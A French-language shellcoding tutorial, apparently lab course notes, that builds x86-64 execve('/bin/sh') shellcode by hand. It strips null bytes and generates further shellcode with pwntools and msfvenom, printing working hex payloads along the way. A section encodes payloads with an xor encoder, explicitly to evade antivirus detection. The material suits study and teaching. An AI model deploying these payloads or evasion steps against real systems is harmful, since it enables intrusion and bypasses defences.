# Outils de Shellcoding

***

## <mark style="color:red;">🧠 Outils de Shellcoding</mark>

***

### <mark style="color:blue;">🐚 Shellcode</mark> <mark style="color:blue;"></mark><mark style="color:blue;">`/bin/sh`</mark>

Avant de continuer avec les outils et ressources en ligne, essayons de **construire notre propre shellcode `/bin/sh`**.&#x20;

Pour cela, nous pouvons utiliser l’appel système `execve` avec le **numéro de syscall 59**, qui nous permet d’exécuter une application système :

```bash
mrroboteLiot_1@htb[/htb]$ man -s 2 execve
```

```
int execve(const char *pathname, char *const argv[], char *const envp[]);
```

Comme on peut le voir, le syscall `execve` accepte **3 arguments**. Nous avons besoin d’exécuter `/bin/sh /bin/sh`, ce qui nous placera dans un shell `sh`. Donc, notre fonction finale sera :

```c
execve("/bin//sh", ["/bin//sh"], NULL);
```

Nous allons donc initialiser nos arguments comme suit :

* `rax` → 59 (numéro du syscall `execve`)
* `rdi` → `["/bin//sh"]` (pointeur vers le programme à exécuter)
* `rsi` → `["/bin//sh"]` (liste des arguments)
* `rdx` → `NULL` (pas de variables d’environnement)

**Note :** Nous avons ajouté un `/` supplémentaire dans `'/bin//sh'` afin que le **nombre total de caractères soit 8**, ce qui remplit un registre 64 bits. Ainsi, nous n’avons pas à nous soucier de vider le registre ou de résidus indésirables. Les `/` supplémentaires sont **ignorés sous Linux**, donc c’est une **astuce utile** utilisée en exploitation binaire pour équilibrer le nombre d’octets.

En utilisant les concepts vus précédemment pour effectuer un syscall, le code assembleur suivant exécute le syscall requis :

```nasm
global _start

section .text
_start:
    mov rax, 59         ; numéro de syscall execve
    push 0              ; NULL pour terminer la chaîne
    mov rdi, '/bin//sh' ; premier argument pour /bin/sh
    push rdi            ; empiler sur la stack
    mov rdi, rsp        ; pointeur vers '/bin//sh'
    push 0              ; NULL
    push rdi            ; deuxième argument
    mov rsi, rsp        ; pointeur vers les arguments
    mov rdx, 0          ; environnement NULL
    syscall
```

On remarque que ce code **contient des octets NULL**, donc il **ne produira pas un shellcode fonctionnel**.

```
Stack (mémoire):
                     
0x7fffffffdfe0: │ 0x7fffffffdff0 │ ← rsi pointe ici (argv[0])
                ├────────────────┤
0x7fffffffdfe8: │ 0x0000000000 │   (argv[1] = NULL)
                ├────────────────┤
0x7fffffffdff0: │ '/bin//sh'     │ ← rdi pointe ici (pathname)
                ├────────────────┤
0x7fffffffdff8: │ 0x0000000000 │   (NULL terminator de string)
                └────────────────┘

VUE CONCEPTUELLE
================

execve(pathname, argv[], envp[])
         │        │       │
         │        │       └─→ rdx = NULL
         │        │
         │        └─→ rsi → [ptr1, NULL]
         │                    │
         │                    └─→ ptr1 → "/bin//sh"
         │
         └─→ rdi → "/bin//sh"
```

***

#### <mark style="color:green;">✅ Objectif : retirer les NULLs</mark>

We can zero-out `rdx` with `xor`, and then push it for string terminators instead of pushing `0`:Code: nasm

```nasm
_start:
    mov al, 59          ; execve syscall number
    xor rdx, rdx        ; set env to NULL
    push rdx            ; push NULL string terminator
    mov rdi, '/bin//sh' ; first arg to /bin/sh
    push rdi            ; push to stack 
    mov rdi, rsp        ; move pointer to ['/bin//sh']
    push rdx            ; push NULL string terminator
    push rdi            ; push second arg to ['/bin//sh']
    mov rsi, rsp        ; pointer to args
    syscall
```

```bash
python3 shellcoder.py sh
```

```
b03b4831d25248bf2f62696e2f2f7368574889e752574889e60f05
27 octets - Aucun octet NULL
```

***

### <mark style="color:blue;">🧰 Shellcraft</mark>

Commençons avec **pwntools** et sa bibliothèque `shellcraft`, qui permet de **générer du shellcode pour divers appels systèmes**. Pour lister les syscalls disponibles :

```bash
 pwn shellcraft -l 'amd64.linux'
```

```
...SNIP...
amd64.linux.sh
```

Nous voyons que le syscall `amd64.linux.sh` nous donne un shell comme notre shellcode précédent. Pour générer son shellcode :

```bash
mrroboteLiot_1@htb[/htb]$ pwn shellcraft amd64.linux.sh
```

```
6a6848b82f62696e2f2f2f73504889e768726901018134240101010131f6566a085e4801e6564889e631d26a3b580f05
```

Ce shellcode est **moins optimisé** que le nôtre. On peut le tester avec `-r` :

```bash
mrroboteLiot_1@htb[/htb]$ pwn shellcraft amd64.linux.sh -r
```

```
$ whoami
root
```

On peut aussi utiliser `Python3` pour accéder aux appels avancés :

```python
>>> from pwn import *
>>> context(os="linux", arch="amd64", log_level="error")
>>> syscall = shellcraft.execve(path='/bin/sh', argv=['/bin/sh'])
>>> asm(syscall).hex()
```

```
'48b801010101010101015048b82e63686f2e726901483104244889e748b801010101010101015048b82e63686f2e7269014831042431f6566a085e4801e6564889e631d26a3b580f05'
```

Puis le tester avec `loader.py` :

```bash
python3 loader.py '48b8...0f05'
```

```
$ whoami
root
```

***

### <mark style="color:blue;">🧨 Msfvenom</mark>

Utilisons maintenant `msfvenom` pour générer du shellcode. Lister les payloads disponibles :

```bash
msfvenom -l payloads | grep 'linux/x64'
```

Exécuter un shell via `/bin/sh` :

{% code fullWidth="true" %}
```bash
msfvenom -p 'linux/x64/exec' CMD='sh' -a 'x64' --platform 'linux' -f 'hex'
```
{% endcode %}

```
Payload size: 48 bytes
6a3b589948bb2f62696e2f736800534889e7682d6300004889e652e80300000073680056574889e60f05
```

Tester avec `loader.py` :

```bash
python3 loader.py '6a3b...0f05'
```

```
$ whoami
root
```

***

### <mark style="color:blue;">🔐 Encodage de Shellcode</mark>

On peut **encoder nos shellcodes** pour éviter la détection par antivirus ou protections. Liste des encodeurs disponibles :

```bash
msfvenom -l encoders
```

Encoder avec `x64/xor` :

{% code fullWidth="true" %}
```bash
msfvenom -p 'linux/x64/exec' CMD='sh' -a 'x64' --platform 'linux' -f 'hex' -e 'x64/xor'
```
{% endcode %}

```
Payload size: 87 bytes
4831c94881e9faffffff488d05efffffff...
```

Tester :

```bash
python3 loader.py '4831c9...'
```

```
$ whoami
root
```

On peut aussi encoder plusieurs fois avec `-i` :

```bash
msfvenom -i 5 ...
```

***

### <mark style="color:blue;">🛠 Encoder son propre shellcode</mark>

Encoder un shellcode écrit manuellement :

{% code fullWidth="true" %}
```bash
python3 -c "import sys; sys.stdout.buffer.write(bytes.fromhex('b03b48...0f05'))" > shell.bin
msfvenom -p - -a 'x64' --platform 'linux' -f 'hex' -e 'x64/xor' < shell.bin
```
{% endcode %}

***

### <mark style="color:blue;">🌐 Ressources de Shellcode</mark>

Enfin, utilisez des sites comme :

* **Shell-Storm** → [http://shell-storm.org/shellcode/](http://shell-storm.org/shellcode/)
* **Exploit-DB** → [https://www.exploit-db.com/](https://www.exploit-db.com/)

Exemple : un shellcode `/bin/sh` de 22 octets trouvé sur Exploit DB peut être plus adapté si l’espace est limité (ex. overflow de 22 octets).

***
